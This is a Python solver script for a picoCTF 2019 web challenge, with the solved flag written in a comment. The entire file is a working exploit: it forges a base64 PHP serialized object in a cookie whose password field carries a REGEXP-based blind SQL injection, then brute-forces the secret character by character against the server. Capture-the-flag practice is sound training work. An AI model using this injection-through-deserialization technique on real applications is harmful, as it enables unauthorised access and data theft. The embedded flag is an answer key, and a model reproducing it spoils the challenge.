#!/usr/bin/env python3
from base64 import b64encode
import requests
import string

# picoCTF{c9f6ad462c6bb64a53c6e7a6452a6eb7}
ans = '^picoCTF{'
URL = 'https://2019shell1.picoctf.com/problem/62195/index.php?file=admin'
template = 'O:8:"siteuser":2:{{s:8:"username";s:5:"admin";s:8:"password";s:{}:"\') or (password REGEXP \'{}\') limit 1 #";}}'

while True:
    # 0-9, a-f actually
    for c in string.printable:
        tmp = ans + c
        print(f"trying {tmp}")
        cookies = {
            'user_info':
            b64encode(template.format(len(tmp) + 36, tmp).encode()).decode()
        }
        res = requests.get(URL, cookies=cookies)
        if "Flag" in res.text:
            ans = tmp
            break
    print(f"Bruteforced flag: {ans}")
